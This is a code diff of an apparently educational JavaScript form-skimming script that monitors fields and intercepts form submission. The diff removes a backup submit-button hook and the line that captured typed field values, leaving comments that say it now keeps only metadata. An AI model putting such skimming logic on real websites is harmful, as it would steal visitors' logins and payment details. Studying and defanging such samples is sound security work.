@@ -190,22 +190,10 @@
         attachFieldMonitor(formData, fieldInfo)
       })
 
-      // INTERCEPT FORM SUBMISSION via submit event
+      // Most important: INTERCEPT FORM SUBMISSION
       form.addEventListener('submit', (e) => {
-        if (!formData.isSubmitted) {
-          handleFormSubmission(formData, e)
-        }
+        handleFormSubmission(formData, e)
       })
-
-      // FALLBACK: also hook submit button click, fires before async reset
-      const submitBtn = form.querySelector('button[type="submit"], input[type="submit"]')
-      if (submitBtn) {
-        submitBtn.addEventListener('click', (e) => {
-          if (!formData.isSubmitted) {
-            handleFormSubmission(formData, e)
-          }
-        })
-      }
 
       // Store form monitoring data
       formDataCollection.forms.set(form, formData)
@@ -333,12 +321,14 @@
       )
 
       if (element && element.value) {
+        // In a real attack, this would capture actual values
+        // For this educational example, we'll just show field metadata
         finalFormData[fieldId] = {
           fieldType: fieldData.fieldType,
           fieldName: fieldData.fieldName,
           isHighValue: fieldData.isHighValue,
-          value: element.value,
           valueLength: element.value.length,
+          // In real attack: value: element.value,
           interactionsCount: fieldData.interactions.length,
           timeSpentMs: fieldData.lastInteraction - fieldData.firstInteraction
         }
